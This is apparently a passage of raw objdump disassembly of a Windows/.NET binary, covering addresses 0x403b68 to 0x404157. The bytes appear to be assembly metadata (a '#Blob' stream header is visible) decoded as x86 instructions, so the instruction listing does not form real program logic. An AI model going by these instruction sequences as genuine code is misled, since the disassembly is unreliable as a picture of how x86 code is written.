  403b68:	44                   	inc    %esp
  403b69:	00 00                	add    %al,(%eax)
  403b6b:	00 8c 2a 00 00 54 03 	add    %cl,0x3540000(%edx,%ebp,1)
  403b72:	00 00                	add    %al,(%eax)
  403b74:	23 42 6c             	and    0x6c(%edx),%eax
  403b77:	6f                   	outsl  %ds:(%esi),(%dx)
  403b78:	62 00                	bound  %eax,(%eax)
  403b7a:	00 00                	add    %al,(%eax)
  403b7c:	00 00                	add    %al,(%eax)
  403b7e:	00 00                	add    %al,(%eax)
  403b80:	02 00                	add    (%eax),%al
  403b82:	00 01                	add    %al,(%ecx)
  403b84:	57                   	push   %edi
  403b85:	3d a2 3d 09 0a       	cmp    $0xa093da2,%eax
  403b8a:	00 00                	add    %al,(%eax)
  403b8c:	00 fa                	add    %bh,%dl
  403b8e:	25 33 00 16 00       	and    $0x160033,%eax
  403b93:	00 01                	add    %al,(%ecx)
  403b95:	00 00                	add    %al,(%eax)
  403b97:	00 41 00             	add    %al,0x0(%ecx)
  403b9a:	00 00                	add    %al,(%eax)
  403b9c:	09 00                	or     %eax,(%eax)
  403b9e:	00 00                	add    %al,(%eax)
  403ba0:	24 00                	and    $0x0,%al
  403ba2:	00 00                	add    %al,(%eax)
  403ba4:	30 00                	xor    %al,(%eax)
  403ba6:	00 00                	add    %al,(%eax)
  403ba8:	1e                   	push   %ds
  403ba9:	00 00                	add    %al,(%eax)
  403bab:	00 82 00 00 00 01    	add    %al,0x1000000(%edx)
  403bb1:	00 00                	add    %al,(%eax)
  403bb3:	00 08                	add    %cl,(%eax)
  403bb5:	00 00                	add    %al,(%eax)
  403bb7:	00 01                	add    %al,(%ecx)
  403bb9:	00 00                	add    %al,(%eax)
  403bbb:	00 18                	add    %bl,(%eax)
  403bbd:	00 00                	add    %al,(%eax)
  403bbf:	00 01                	add    %al,(%ecx)
  403bc1:	00 00                	add    %al,(%eax)
  403bc3:	00 01                	add    %al,(%ecx)
  403bc5:	00 00                	add    %al,(%eax)
  403bc7:	00 01                	add    %al,(%ecx)
  403bc9:	00 00                	add    %al,(%eax)
  403bcb:	00 01                	add    %al,(%ecx)
  403bcd:	00 00                	add    %al,(%eax)
  403bcf:	00 01                	add    %al,(%ecx)
  403bd1:	00 00                	add    %al,(%eax)
  403bd3:	00 03                	add    %al,(%ebx)
  403bd5:	00 00                	add    %al,(%eax)
  403bd7:	00 01                	add    %al,(%ecx)
  403bd9:	00 00                	add    %al,(%eax)
  403bdb:	00 01                	add    %al,(%ecx)
  403bdd:	00 00                	add    %al,(%eax)
  403bdf:	00 03                	add    %al,(%ebx)
  403be1:	00 00                	add    %al,(%eax)
  403be3:	00 05 00 00 00 01    	add    %al,0x1000000
  403be9:	00 00                	add    %al,(%eax)
  403beb:	00 00                	add    %al,(%eax)
  403bed:	00 0a                	add    %cl,(%edx)
  403bef:	00 01                	add    %al,(%ecx)
  403bf1:	00 00                	add    %al,(%eax)
  403bf3:	00 00                	add    %al,(%eax)
  403bf5:	00 06                	add    %al,(%esi)
  403bf7:	00 74 00 6d          	add    %dh,0x6d(%eax,%eax,1)
  403bfb:	00 0a                	add    %cl,(%edx)
  403bfd:	00 90 00 7b 00 0e    	add    %dl,0xe007b00(%eax)
  403c03:	00 25 02 06 02 06    	add    %ah,0x6020602
  403c09:	00 a1 02 6d 00 0a    	add    %ah,0xa006d02(%ecx)
  403c0f:	00 53 04             	add    %dl,0x4(%ebx)
  403c12:	7b 00                	jnp    0x403c14
  403c14:	0a 00                	or     (%eax),%al
  403c16:	63 04 7b             	arpl   %eax,(%ebx,%edi,2)
  403c19:	00 06                	add    %al,(%esi)
  403c1b:	00 3f                	add    %bh,(%edi)
  403c1d:	05 20 05 06 00       	add    $0x60520,%eax
  403c22:	52                   	push   %edx
  403c23:	05 20 05 06 00       	add    $0x60520,%eax
  403c28:	ab                   	stos   %eax,%es:(%edi)
  403c29:	05 8b 05 06 00       	add    $0x6058b,%eax
  403c2e:	cb                   	lret
  403c2f:	05 8b 05 06 00       	add    $0x6058b,%eax
  403c34:	f2 05 20 05 06 00    	repnz add $0x60520,%eax
  403c3a:	2c 06                	sub    $0x6,%al
  403c3c:	1b 06                	sbb    (%esi),%eax
  403c3e:	06                   	push   %es
  403c3f:	00 5f 06             	add    %bl,0x6(%edi)
  403c42:	8b 05 06 00 7a 06    	mov    0x67a0006,%eax
  403c48:	6d                   	insl   (%dx),%es:(%edi)
  403c49:	00 06                	add    %al,(%esi)
  403c4b:	00 8b 06 1b 06 0a    	add    %cl,0xa061b06(%ebx)
  403c51:	00 98 06 7b 00 06    	add    %bl,0x6007b06(%eax)
  403c57:	00 b6 06 a4 06 06    	add    %dh,0x606a406(%esi)
  403c5d:	00 e7                	add    %ah,%bh
  403c5f:	06                   	push   %es
  403c60:	dd 06                	fldl   (%esi)
  403c62:	3b 00                	cmp    (%eax),%eax
  403c64:	fd                   	std
  403c65:	06                   	push   %es
  403c66:	00 00                	add    %al,(%eax)
  403c68:	06                   	push   %es
  403c69:	00 19                	add    %bl,(%ecx)
  403c6b:	07                   	pop    %es
  403c6c:	6d                   	insl   (%dx),%es:(%edi)
  403c6d:	00 0e                	add    %cl,(%esi)
  403c6f:	00 47 07             	add    %al,0x7(%edi)
  403c72:	34 07                	xor    $0x7,%al
  403c74:	0e                   	push   %cs
  403c75:	00 6e 07             	add    %ch,0x7(%esi)
  403c78:	34 07                	xor    $0x7,%al
  403c7a:	0e                   	push   %cs
  403c7b:	00 92 07 34 07 06    	add    %dl,0x6073407(%edx)
  403c81:	00 de                	add    %bl,%dh
  403c83:	07                   	pop    %es
  403c84:	6d                   	insl   (%dx),%es:(%edi)
  403c85:	00 06                	add    %al,(%esi)
  403c87:	00 e8                	add    %ch,%al
  403c89:	07                   	pop    %es
  403c8a:	6d                   	insl   (%dx),%es:(%edi)
  403c8b:	00 06                	add    %al,(%esi)
  403c8d:	00 03                	add    %al,(%ebx)
  403c8f:	08 f7                	or     %dh,%bh
  403c91:	07                   	pop    %es
  403c92:	06                   	push   %es
  403c93:	00 3b                	add    %bh,(%ebx)
  403c95:	08 f7                	or     %dh,%bh
  403c97:	07                   	pop    %es
  403c98:	06                   	push   %es
  403c99:	00 56 08             	add    %dl,0x8(%esi)
  403c9c:	6d                   	insl   (%dx),%es:(%edi)
  403c9d:	00 06                	add    %al,(%esi)
  403c9f:	00 b2 08 dd 06 06    	add    %dh,0x606dd08(%edx)
  403ca5:	00 de                	add    %bl,%dh
  403ca7:	08 6d 00             	or     %ch,0x0(%ebp)
  403caa:	06                   	push   %es
  403cab:	00 ea                	add    %ch,%dl
  403cad:	08 6d 00             	or     %ch,0x0(%ebp)
  403cb0:	06                   	push   %es
  403cb1:	00 f7                	add    %dh,%bh
  403cb3:	08 dd                	or     %bl,%ch
  403cb5:	06                   	push   %es
  403cb6:	06                   	push   %es
  403cb7:	00 00                	add    %al,(%eax)
  403cb9:	09 dd                	or     %ebx,%ebp
  403cbb:	06                   	push   %es
  403cbc:	06                   	push   %es
  403cbd:	00 0f                	add    %cl,(%edi)
  403cbf:	09 dd                	or     %ebx,%ebp
  403cc1:	06                   	push   %es
  403cc2:	06                   	push   %es
  403cc3:	00 37                	add    %dh,(%edi)
  403cc5:	09 dd                	or     %ebx,%ebp
  403cc7:	06                   	push   %es
  403cc8:	06                   	push   %es
  403cc9:	00 cc                	add    %cl,%ah
  403ccb:	09 8b 05 06 00 db    	or     %ecx,-0x24fff9fb(%ebx)
  403cd1:	09 6d 00             	or     %ebp,0x0(%ebp)
  403cd4:	06                   	push   %es
  403cd5:	00 fe                	add    %bh,%dh
  403cd7:	09 dd                	or     %ebx,%ebp
  403cd9:	06                   	push   %es
  403cda:	06                   	push   %es
  403cdb:	00 28                	add    %ch,(%eax)
  403cdd:	0a 0b                	or     (%ebx),%cl
  403cdf:	0a 06                	or     (%esi),%al
  403ce1:	00 38                	add    %bh,(%eax)
  403ce3:	0a 0b                	or     (%ebx),%cl
  403ce5:	0a 06                	or     (%esi),%al
  403ce7:	00 65 0a             	add    %ah,0xa(%ebp)
  403cea:	0b 0a                	or     (%edx),%ecx
  403cec:	06                   	push   %es
  403ced:	00 84 0a 0b 0a 06 00 	add    %al,0x60a0b(%edx,%ecx,1)
  403cf4:	ad                   	lods   %ds:(%esi),%eax
  403cf5:	0a 0b                	or     (%ebx),%cl
  403cf7:	0a 06                	or     (%esi),%al
  403cf9:	00 c1                	add    %al,%cl
  403cfb:	0a 0b                	or     (%ebx),%cl
  403cfd:	0a 06                	or     (%esi),%al
  403cff:	00 e2                	add    %ah,%dl
  403d01:	0a 0b                	or     (%ebx),%cl
  403d03:	0a 06                	or     (%esi),%al
  403d05:	00 ef                	add    %ch,%bh
  403d07:	0a dd                	or     %ch,%bl
  403d09:	06                   	push   %es
  403d0a:	06                   	push   %es
  403d0b:	00 f6                	add    %dh,%dh
  403d0d:	0a 0b                	or     (%ebx),%cl
  403d0f:	0a 06                	or     (%esi),%al
  403d11:	00 13                	add    %dl,(%ebx)
  403d13:	0b 6d 00             	or     0x0(%ebp),%ebp
  403d16:	06                   	push   %es
  403d17:	00 3c 0b             	add    %bh,(%ebx,%ecx,1)
  403d1a:	0b 0a                	or     (%edx),%ecx
  403d1c:	06                   	push   %es
  403d1d:	00 55 0b             	add    %dl,0xb(%ebp)
  403d20:	0b 0a                	or     (%edx),%ecx
  403d22:	06                   	push   %es
  403d23:	00 93 0b dd 06 06    	add    %dl,0x606dd0b(%ebx)
  403d29:	00 a7 0b 6d 00 0e    	add    %ah,0xe006d0b(%edi)
  403d2f:	00 d9                	add    %bl,%cl
  403d31:	0b 34 07             	or     (%edi,%eax,1),%esi
  403d34:	0e                   	push   %cs
  403d35:	00 31                	add    %dh,(%ecx)
  403d37:	0c 34                	or     $0x34,%al
  403d39:	07                   	pop    %es
  403d3a:	0e                   	push   %cs
  403d3b:	00 6a 0c             	add    %ch,0xc(%edx)
  403d3e:	54                   	push   %esp
  403d3f:	0c 06                	or     $0x6,%al
  403d41:	00 9d 0c dd 06 06    	add    %bl,0x606dd0c(%ebp)
  403d47:	00 aa 0c dd 06 06    	add    %ch,0x606dd0c(%edx)
  403d4d:	00 d7                	add    %dl,%bh
  403d4f:	0c c7                	or     $0xc7,%al
  403d51:	0c 06                	or     $0x6,%al
  403d53:	00 e0                	add    %ah,%al
  403d55:	0c c7                	or     $0xc7,%al
  403d57:	0c 06                	or     $0x6,%al
  403d59:	00 72 0d             	add    %dh,0xd(%edx)
  403d5c:	6d                   	insl   (%dx),%es:(%edi)
  403d5d:	00 0a                	add    %cl,(%edx)
  403d5f:	00 79 0d             	add    %bh,0xd(%ecx)
  403d62:	7b 00                	jnp    0x403d64
  403d64:	0e                   	push   %cs
  403d65:	00 8c 0d 06 02 0e 00 	add    %cl,0xe0206(%ebp,%ecx,1)
  403d6c:	92                   	xchg   %eax,%edx
  403d6d:	0d 06 02 0a 00       	or     $0xa0206,%eax
  403d72:	05 0e 7b 00 06       	add    $0x6007b0e,%eax
  403d77:	00 15 0e 1b 06 00    	add    %dl,0x61b0e
  403d7d:	00 00                	add    %al,(%eax)
  403d7f:	00 01                	add    %al,(%ecx)
  403d81:	00 00                	add    %al,(%eax)
  403d83:	00 00                	add    %al,(%eax)
  403d85:	00 01                	add    %al,(%ecx)
  403d87:	00 01                	add    %al,(%ecx)
  403d89:	00 00                	add    %al,(%eax)
  403d8b:	00 10                	add    %dl,(%eax)
  403d8d:	00 17                	add    %dl,(%edi)
  403d8f:	00 1f                	add    %bl,(%edi)
  403d91:	00 05 00 01 00 01    	add    %al,0x1000100
  403d97:	00 82 01 10 00 33    	add    %al,0x33001001(%edx)
  403d9d:	00 00                	add    %al,(%eax)
  403d9f:	00 05 00 1e 00 20    	add    %al,0x20001e00
  403da5:	00 01                	add    %al,(%ecx)
  403da7:	01 10                	add    %edx,(%eax)
  403da9:	00 41 00             	add    %al,0x0(%ecx)
  403dac:	1f                   	pop    %ds
  403dad:	00 05 00 20 00 23    	add    %al,0x23002000
  403db3:	00 02                	add    %al,(%edx)
  403db5:	00 10                	add    %dl,(%eax)
  403db7:	00 53 00             	add    %dl,0x0(%ebx)
  403dba:	00 00                	add    %al,(%eax)
  403dbc:	09 00                	or     %eax,(%eax)
  403dbe:	20 00                	and    %al,(%eax)
  403dc0:	24 00                	and    $0x0,%al
  403dc2:	03 01                	add    (%ecx),%eax
  403dc4:	10 00                	adc    %al,(%eax)
  403dc6:	74 08                	je     0x403dd0
  403dc8:	00 00                	add    %al,(%eax)
  403dca:	05 00 21 00 2b       	add    $0x2b002100,%eax
  403dcf:	00 00                	add    %al,(%eax)
  403dd1:	00 00                	add    %al,(%eax)
  403dd3:	00 73 09             	add    %dh,0x9(%ebx)
  403dd6:	00 00                	add    %al,(%eax)
  403dd8:	05 00 22 00 2d       	add    $0x2d002200,%eax
  403ddd:	00 03                	add    %al,(%ebx)
  403ddf:	01 10                	add    %edx,(%eax)
  403de1:	00 d8                	add    %bl,%al
  403de3:	0d 00 00 05 00       	or     $0x50000,%eax
  403de8:	23 00                	and    (%eax),%eax
  403dea:	2d 00 03 01 10       	sub    $0x10010300,%eax
  403def:	00 3b                	add    %bh,(%ebx)
  403df1:	0e                   	push   %cs
  403df2:	00 00                	add    %al,(%eax)
  403df4:	05 00 24 00 2f       	add    $0x2f002400,%eax
  403df9:	00 11                	add    %dl,(%ecx)
  403dfb:	00 95 00 0a 00 11    	add    %dl,0x11000a00(%ebp)
  403e01:	00 9e 00 0a 00 16    	add    %bl,0x16000a00(%esi)
  403e07:	00 a6 00 0a 00 16    	add    %ah,0x16000a00(%esi)
  403e0d:	00 b2 00 0d 00 16    	add    %dh,0x16000d00(%edx)
  403e13:	00 c3                	add    %al,%bl
  403e15:	00 0a                	add    %cl,(%edx)
  403e17:	00 11                	add    %dl,(%ecx)
  403e19:	00 da                	add    %bl,%dl
  403e1b:	00 0d 00 11 00 e6    	add    %cl,0xe6001100
  403e21:	00 0a                	add    %cl,(%edx)
  403e23:	00 11                	add    %dl,(%ecx)
  403e25:	00 f1                	add    %dh,%cl
  403e27:	00 0d 00 11 00 02    	add    %cl,0x2001100
  403e2d:	01 0a                	add    %ecx,(%edx)
  403e2f:	00 16                	add    %dl,(%esi)
  403e31:	00 0e                	add    %cl,(%esi)
  403e33:	01 0a                	add    %ecx,(%edx)
  403e35:	00 11                	add    %dl,(%ecx)
  403e37:	00 1b                	add    %bl,(%ebx)
  403e39:	01 0d 00 11 00 2e    	add    %ecx,0x2e001100
  403e3f:	01 0d 00 11 00 39    	add    %ecx,0x39001100
  403e45:	01 10                	add    %edx,(%eax)
  403e47:	00 11                	add    %dl,(%ecx)
  403e49:	00 46 01             	add    %al,0x1(%esi)
  403e4c:	0a 00                	or     (%eax),%al
  403e4e:	16                   	push   %ss
  403e4f:	00 52 01             	add    %dl,0x1(%edx)
  403e52:	0a 00                	or     (%eax),%al
  403e54:	11 00                	adc    %eax,(%eax)
  403e56:	62 01                	bound  %eax,(%ecx)
  403e58:	0a 00                	or     (%eax),%al
  403e5a:	11 00                	adc    %eax,(%eax)
  403e5c:	78 01                	js     0x403e5f
  403e5e:	0d 00 11 00 8c       	or     $0x8c001100,%eax
  403e63:	01 0d 00 11 00 a4    	add    %ecx,0xa4001100
  403e69:	01 0d 00 11 00 bd    	add    %ecx,0xbd001100
  403e6f:	01 0d 00 16 00 d6    	add    %ecx,0xd6001600
  403e75:	01 0a                	add    %ecx,(%edx)
  403e77:	00 16                	add    %dl,(%esi)
  403e79:	00 e7                	add    %ah,%bh
  403e7b:	01 0a                	add    %ecx,(%edx)
  403e7d:	00 16                	add    %dl,(%esi)
  403e7f:	00 f1                	add    %dh,%cl
  403e81:	01 0a                	add    %ecx,(%edx)
  403e83:	00 16                	add    %dl,(%esi)
  403e85:	00 fd                	add    %bh,%ch
  403e87:	01 0a                	add    %ecx,(%edx)
  403e89:	00 36                	add    %dh,(%esi)
  403e8b:	00 2b                	add    %ch,(%ebx)
  403e8d:	02 13                	add    (%ebx),%dl
  403e8f:	00 11                	add    %dl,(%ecx)
  403e91:	00 39                	add    %bh,(%ecx)
  403e93:	02 17                	add    (%edi),%dl
  403e95:	00 11                	add    %dl,(%ecx)
  403e97:	00 42 02             	add    %al,0x2(%edx)
  403e9a:	17                   	pop    %ss
  403e9b:	00 11                	add    %dl,(%ecx)
  403e9d:	00 a8 02 37 00 11    	add    %ch,0x11003702(%eax)
  403ea3:	00 38                	add    %bh,(%eax)
  403ea5:	06                   	push   %es
  403ea6:	9d                   	popf
  403ea7:	00 56 80             	add    %dl,-0x80(%esi)
  403eaa:	03 04 10             	add    (%eax,%edx,1),%eax
  403ead:	00 16                	add    %dl,(%esi)
  403eaf:	00 2c 04             	add    %ch,(%esp,%eax,1)
  403eb2:	71 00                	jno    0x403eb4
  403eb4:	11 00                	adc    %eax,(%eax)
  403eb6:	36 04 0a             	ss add $0xa,%al
  403eb9:	00 06                	add    %al,(%esi)
  403ebb:	00 87 08 0a 00 13    	add    %al,0x13000a08(%edi)
  403ec1:	01 b8 09 bb 01 06    	add    %edi,0x601bb09(%eax)
  403ec7:	00 eb                	add    %ch,%bl
  403ec9:	0d 0a 00 06 00       	or     $0x6000a,%eax
  403ece:	87 05 0a 00 00 00    	xchg   %eax,0xa
  403ed4:	00 00                	add    %al,(%eax)
  403ed6:	80 00 91             	addb   $0x91,(%eax)
  403ed9:	20 52 02             	and    %dl,0x2(%edx)
  403edc:	1b 00                	sbb    (%eax),%eax
  403ede:	01 00                	add    %eax,(%eax)
  403ee0:	58                   	pop    %eax
  403ee1:	20 00                	and    %al,(%eax)
  403ee3:	00 00                	add    %al,(%eax)
  403ee5:	00 91 00 67 02 23    	add    %dl,0x23026700(%ecx)
  403eeb:	00 05 00 25 21 00    	add    %al,0x212500
  403ef1:	00 00                	add    %al,(%eax)
  403ef3:	00 96 00 6c 02 29    	add    %dl,0x29026c00(%esi)
  403ef9:	00 06                	add    %al,(%esi)
  403efb:	00 34 21             	add    %dh,(%ecx,%eiz,1)
  403efe:	00 00                	add    %al,(%eax)
  403f00:	00 00                	add    %al,(%eax)
  403f02:	91                   	xchg   %eax,%ecx
  403f03:	00 70 02             	add    %dh,0x2(%eax)
  403f06:	29 00                	sub    %eax,(%eax)
  403f08:	06                   	push   %es
  403f09:	00 74 21 00          	add    %dh,0x0(%ecx,%eiz,1)
  403f0d:	00 00                	add    %al,(%eax)
  403f0f:	00 91 00 85 02 2d    	add    %dl,0x2d028500(%ecx)
  403f15:	00 06                	add    %al,(%esi)
  403f17:	00 f8                	add    %bh,%al
  403f19:	21 00                	and    %eax,(%eax)
  403f1b:	00 00                	add    %al,(%eax)
  403f1d:	00 96 00 94 02 31    	add    %dl,0x31029400(%esi)
  403f23:	00 06                	add    %al,(%esi)
  403f25:	00 20                	add    %ah,(%eax)
  403f27:	22 00                	and    (%eax),%al
  403f29:	00 00                	add    %al,(%eax)
  403f2b:	00 96 00 af 02 3b    	add    %dl,0x3b02af00(%esi)
  403f31:	00 07                	add    %al,(%edi)
  403f33:	00 70 22             	add    %dh,0x22(%eax)
  403f36:	00 00                	add    %al,(%eax)
  403f38:	00 00                	add    %al,(%eax)
  403f3a:	96                   	xchg   %eax,%esi
  403f3b:	00 bc 02 3b 00 08 00 	add    %bh,0x8003b(%edx,%eax,1)
  403f42:	d4 22                	aam    $0x22
  403f44:	00 00                	add    %al,(%eax)
  403f46:	00 00                	add    %al,(%eax)
  403f48:	96                   	xchg   %eax,%esi
  403f49:	00 d5                	add    %dl,%ch
  403f4b:	02 40 00             	add    0x0(%eax),%al
  403f4e:	09 00                	or     %eax,(%eax)
  403f50:	f4                   	hlt
  403f51:	22 00                	and    (%eax),%al
  403f53:	00 00                	add    %al,(%eax)
  403f55:	00 96 00 e8 02 40    	add    %dl,0x4002e800(%esi)
  403f5b:	00 0a                	add    %cl,(%edx)
  403f5d:	00 68 23             	add    %ch,0x23(%eax)
  403f60:	00 00                	add    %al,(%eax)
  403f62:	00 00                	add    %al,(%eax)
  403f64:	91                   	xchg   %eax,%ecx
  403f65:	00 f5                	add    %dh,%ch
  403f67:	02 45 00             	add    0x0(%ebp),%al
  403f6a:	0b 00                	or     (%eax),%eax
  403f6c:	4c                   	dec    %esp
  403f6d:	25 00 00 00 00       	and    $0x0,%eax
  403f72:	96                   	xchg   %eax,%esi
  403f73:	00 06                	add    %al,(%esi)
  403f75:	03 4a 00             	add    0x0(%edx),%ecx
  403f78:	0c 00                	or     $0x0,%al
  403f7a:	68 25 00 00 00       	push   $0x25
  403f7f:	00 96 00 0d 03 3b    	add    %dl,0x3b030d00(%esi)
  403f85:	00 0c 00             	add    %cl,(%eax,%eax,1)
  403f88:	c0 25 00 00 00 00 96 	shlb   $0x96,0x0
  403f8f:	00 1c 03             	add    %bl,(%ebx,%eax,1)
  403f92:	4e                   	dec    %esi
  403f93:	00 0d 00 bc 26 00    	add    %cl,0x26bc00
  403f99:	00 00                	add    %al,(%eax)
  403f9b:	00 96 00 28 03 45    	add    %dl,0x45032800(%esi)
  403fa1:	00 0f                	add    %cl,(%edi)
  403fa3:	00 2c 27             	add    %ch,(%edi,%eiz,1)
  403fa6:	00 00                	add    %al,(%eax)
  403fa8:	00 00                	add    %al,(%eax)
  403faa:	96                   	xchg   %eax,%esi
  403fab:	00 34 03             	add    %dh,(%ebx,%eax,1)
  403fae:	57                   	push   %edi
  403faf:	00 10                	add    %dl,(%eax)
  403fb1:	00 a4 27 00 00 00 00 	add    %ah,0x0(%edi,%eiz,1)
  403fb8:	91                   	xchg   %eax,%ecx
  403fb9:	00 3f                	add    %bh,(%edi)
  403fbb:	03 29                	add    (%ecx),%ebp
  403fbd:	00 12                	add    %dl,(%edx)
  403fbf:	00 ac 29 00 00 00 00 	add    %ch,0x0(%ecx,%ebp,1)
  403fc6:	91                   	xchg   %eax,%ecx
  403fc7:	00 52 03             	add    %dl,0x3(%edx)
  403fca:	45                   	inc    %ebp
  403fcb:	00 12                	add    %dl,(%edx)
  403fcd:	00 b4 2a 00 00 00 00 	add    %dh,0x0(%edx,%ebp,1)
  403fd4:	91                   	xchg   %eax,%ecx
  403fd5:	00 5e 03             	add    %bl,0x3(%esi)
  403fd8:	45                   	inc    %ebp
  403fd9:	00 13                	add    %dl,(%ebx)
  403fdb:	00 04 2c             	add    %al,(%esp,%ebp,1)
  403fde:	00 00                	add    %al,(%eax)
  403fe0:	00 00                	add    %al,(%eax)
  403fe2:	91                   	xchg   %eax,%ecx
  403fe3:	00 71 03             	add    %dh,0x3(%ecx)
  403fe6:	29 00                	sub    %eax,(%eax)
  403fe8:	14 00                	adc    $0x0,%al
  403fea:	a8 2c                	test   $0x2c,%al
  403fec:	00 00                	add    %al,(%eax)
  403fee:	00 00                	add    %al,(%eax)
  403ff0:	91                   	xchg   %eax,%ecx
  403ff1:	00 82 03 29 00 14    	add    %al,0x14002903(%edx)
  403ff7:	00 00                	add    %al,(%eax)
  403ff9:	2d 00 00 00 00       	sub    $0x0,%eax
  403ffe:	91                   	xchg   %eax,%ecx
  403fff:	00 91 03 29 00 14    	add    %dl,0x14002903(%ecx)
  404005:	00 48 2d             	add    %cl,0x2d(%eax)
  404008:	00 00                	add    %al,(%eax)
  40400a:	00 00                	add    %al,(%eax)
  40400c:	91                   	xchg   %eax,%ecx
  40400d:	00 a1 03 45 00 14    	add    %ah,0x14004503(%ecx)
  404013:	00 c4                	add    %al,%ah
  404015:	2d 00 00 00 00       	sub    $0x0,%eax
  40401a:	91                   	xchg   %eax,%ecx
  40401b:	00 aa 03 45 00 15    	add    %ch,0x15004503(%edx)
  404021:	00 14 2e             	add    %dl,(%esi,%ebp,1)
  404024:	00 00                	add    %al,(%eax)
  404026:	00 00                	add    %al,(%eax)
  404028:	91                   	xchg   %eax,%ecx
  404029:	00 b5 03 29 00 16    	add    %dh,0x16002903(%ebp)
  40402f:	00 20                	add    %ah,(%eax)
  404031:	2e 00 00             	add    %al,%cs:(%eax)
  404034:	00 00                	add    %al,(%eax)
  404036:	91                   	xchg   %eax,%ecx
  404037:	00 c8                	add    %cl,%al
  404039:	03 29                	add    (%ecx),%ebp
  40403b:	00 16                	add    %dl,(%esi)
  40403d:	00 2c 2e             	add    %ch,(%esi,%ebp,1)
  404040:	00 00                	add    %al,(%eax)
  404042:	00 00                	add    %al,(%eax)
  404044:	91                   	xchg   %eax,%ecx
  404045:	00 dc                	add    %bl,%ah
  404047:	03 29                	add    (%ecx),%ebp
  404049:	00 16                	add    %dl,(%esi)
  40404b:	00 38                	add    %bh,(%eax)
  40404d:	2e 00 00             	add    %al,%cs:(%eax)
  404050:	00 00                	add    %al,(%eax)
  404052:	96                   	xchg   %eax,%esi
  404053:	00 f0                	add    %dh,%al
  404055:	03 45 00             	add    0x0(%ebp),%eax
  404058:	16                   	push   %ss
  404059:	00 19                	add    %bl,(%ecx)
  40405b:	39 00                	cmp    %eax,(%eax)
  40405d:	00 00                	add    %al,(%eax)
  40405f:	00 86 18 fd 03 5d    	add    %al,0x5d03fd18(%esi)
  404065:	00 17                	add    %dl,(%edi)
  404067:	00 50 20             	add    %dl,0x20(%eax)
  40406a:	00 00                	add    %al,(%eax)
  40406c:	00 00                	add    %al,(%eax)
  40406e:	91                   	xchg   %eax,%ecx
  40406f:	00 10                	add    %dl,(%eax)
  404071:	06                   	push   %es
  404072:	29 00                	sub    %eax,(%eax)
  404074:	17                   	pop    %ss
  404075:	00 98 2e 00 00 00    	add    %bl,0x2e(%eax)
  40407b:	00 91 18 5e 0d 29    	add    %dl,0x290d5e18(%ecx)
  404081:	00 17                	add    %dl,(%edi)
  404083:	00 00                	add    %al,(%eax)
  404085:	00 00                	add    %al,(%eax)
  404087:	00 80 00 96 20 07    	add    %al,0x7209600(%eax)
  40408d:	04 66                	add    $0x66,%al
  40408f:	00 17                	add    %dl,(%edi)
  404091:	00 00                	add    %al,(%eax)
  404093:	00 00                	add    %al,(%eax)
  404095:	00 80 00 96 20 22    	add    %al,0x22209600(%eax)
  40409b:	04 6b                	add    $0x6b,%al
  40409d:	00 19                	add    %bl,(%ecx)
  40409f:	00 21                	add    %ah,(%ecx)
  4040a1:	39 00                	cmp    %eax,(%eax)
  4040a3:	00 00                	add    %al,(%eax)
  4040a5:	00 91 18 5e 0d 29    	add    %dl,0x290d5e18(%ecx)
  4040ab:	00 1b                	add    %bl,(%ebx)
  4040ad:	00 2f                	add    %ch,(%edi)
  4040af:	39 00                	cmp    %eax,(%eax)
  4040b1:	00 00                	add    %al,(%eax)
  4040b3:	00 86 18 fd 03 5d    	add    %al,0x5d03fd18(%esi)
  4040b9:	00 1b                	add    %bl,(%ebx)
  4040bb:	00 37                	add    %dh,(%edi)
  4040bd:	39 00                	cmp    %eax,(%eax)
  4040bf:	00 00                	add    %al,(%eax)
  4040c1:	00 86 18 fd 03 5d    	add    %al,0x5d03fd18(%esi)
  4040c7:	00 1b                	add    %bl,(%ebx)
  4040c9:	00 5c 39 00          	add    %bl,0x0(%ecx,%edi,1)
  4040cd:	00 00                	add    %al,(%eax)
  4040cf:	00 81 00 47 04 74    	add    %al,0x74044700(%ecx)
  4040d5:	00 1b                	add    %bl,(%ebx)
  4040d7:	00 74 39 00          	add    %dh,0x0(%ecx,%edi,1)
  4040db:	00 00                	add    %al,(%eax)
  4040dd:	00 c4                	add    %al,%ah
  4040df:	00 5b 04             	add    %bl,0x4(%ebx)
  4040e2:	7a 00                	jp     0x4040e4
  4040e4:	1c 00                	sbb    $0x0,%al
  4040e6:	28 3a                	sub    %bh,(%edx)
  4040e8:	00 00                	add    %al,(%eax)
  4040ea:	00 00                	add    %al,(%eax)
  4040ec:	c4 08                	les    (%eax),%ecx
  4040ee:	70 04                	jo     0x4040f4
  4040f0:	81 00 1d 00 64 3a    	addl   $0x3a64001d,(%eax)
  4040f6:	00 00                	add    %al,(%eax)
  4040f8:	00 00                	add    %al,(%eax)
  4040fa:	96                   	xchg   %eax,%esi
  4040fb:	00 81 04 4a 00 1d    	add    %al,0x1d004a04(%ecx)
  404101:	00 c4                	add    %al,%ah
  404103:	3a 00                	cmp    (%eax),%al
  404105:	00 00                	add    %al,(%eax)
  404107:	00 96 00 89 04 45    	add    %dl,0x45048900(%esi)
  40410d:	00 1d 00 03 3b 00    	add    %bl,0x3b0300
  404113:	00 00                	add    %al,(%eax)
  404115:	00 91 18 5e 0d 29    	add    %dl,0x290d5e18(%ecx)
  40411b:	00 1e                	add    %bl,(%esi)
  40411d:	00 4b 23             	add    %cl,0x23(%ebx)
  404120:	00 00                	add    %al,(%eax)
  404122:	00 00                	add    %al,(%eax)
  404124:	86 18                	xchg   %bl,(%eax)
  404126:	fd                   	std
  404127:	03 5d 00             	add    0x0(%ebp),%ebx
  40412a:	1e                   	push   %ds
  40412b:	00 53 23             	add    %dl,0x23(%ebx)
  40412e:	00 00                	add    %al,(%eax)
  404130:	00 00                	add    %al,(%eax)
  404132:	86 00                	xchg   %al,(%eax)
  404134:	91                   	xchg   %eax,%ecx
  404135:	08 48 01             	or     %cl,0x1(%eax)
  404138:	1e                   	push   %ds
  404139:	00 4f 3a             	add    %cl,0x3a(%edi)
  40413c:	00 00                	add    %al,(%eax)
  40413e:	00 00                	add    %al,(%eax)
  404140:	86 18                	xchg   %bl,(%eax)
  404142:	fd                   	std
  404143:	03 5d 00             	add    0x0(%ebp),%ebx
  404146:	1f                   	pop    %ds
  404147:	00 57 3a             	add    %dl,0x3a(%edi)
  40414a:	00 00                	add    %al,(%eax)
  40414c:	00 00                	add    %al,(%eax)
  40414e:	86 00                	xchg   %al,(%eax)
  404150:	f7 0d 5d 00 1f 00 ad 	testl  $0x3aad,0x1f005d
  404157:	3a 00 00 
